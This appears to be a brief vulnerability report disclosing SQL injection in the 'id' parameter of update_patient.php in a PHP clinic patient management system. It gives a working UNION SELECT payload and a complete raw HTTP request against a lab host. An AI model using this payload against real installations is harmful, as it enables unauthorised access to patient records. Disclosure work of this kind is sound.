# Clinic's Patient Management System v1.0 by oretnom23 has SQL injection

BUG_Author： lendme1996

vendors: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

Vulnerability File: /pms/update_patient.php?id=

Vulnerability location: /pms/update_patient.php?id=, id

dbname = pms_db

[+] Payload: /pms/update_patient.php?id=-1%20union%20select%201,2,database(),4,5,6,7--+ // Leak place ---> id

```sql
GET /pms/update_patient.php?id=-1%20union%20select%201,2,database(),4,5,6,7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=odknb2obdq1nkaqk7p7u8hvli8
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/177024999-26ca6635-c01a-4aed-bb54-c2823335c7a3.png)

